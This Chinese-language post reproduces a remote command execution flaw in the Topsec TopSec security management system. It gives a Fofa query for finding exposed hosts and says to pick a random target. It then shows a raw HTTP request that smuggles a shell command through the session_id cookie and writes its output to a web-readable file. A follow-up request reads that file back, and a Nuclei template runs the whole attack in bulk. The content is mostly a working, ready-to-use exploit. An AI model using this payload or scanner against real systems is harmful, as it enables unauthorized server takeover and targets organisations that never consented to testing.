**漏洞简介**

天融信TopSec安全管理系统 Cookie字段存在远程命令执行漏洞，通过该漏洞，攻击者可通过构造恶意字符串，执行任意系统命令，从而拿下服务器权限。

**漏洞复现**

步骤一：在Fofa中搜索以下语法并随机确定要进行攻击测试的目标....

```
# Fofa搜索语法title="Web User Login" && body="/cgi/maincgi.cgi?Url=VerifyCode"
```

步骤二：开启代理并打开BP对其首页进行抓包拦截....修改请求头内容...

执行命令

```

GET /cgi/maincgi.cgi?Url=aa HTTP/1.1
Host: ip
Cookie: session_id_443=1|echo `id`  > /www/htdocs/site/image/qqqq.txt;
User-Agent: Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36
```

查看结果

```
GET /site/image/qqqq.txt HTTP/1.1
Host:IP
Cookie: session_id_443=1
User-Agent: Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36
```

**批量脚本**

```

id: template-id

info:
  name: test_qrcode_b-rce
  author: kali
  severity: info
  description: description
  reference:
    - https://
  tags: tags

requests:
  - raw:
      # this request will be sent to {{Hostname}} to get the token
      - |
        GET /cgi/maincgi.cgi?Url=aa HTTP/1.1
        Host: {{Hostname}}
        Cookie: session_id_443=1|echo `id`  > /www/htdocs/site/image/qqqq.txt;
        User-Agent: Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36

      # This request will be sent instead to https://api.target.com:443 to verify the token validity
      - |
        @Host: {{Hostname}}
        GET /site/image/qqqq.txt HTTP/1.1
        Host: {{Hostname}}
        Cookie: session_id_443=1
        User-Agent: Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36



    matchers:
      - type: word
        part: body
        words:
          - 'uid'
        condition: or
```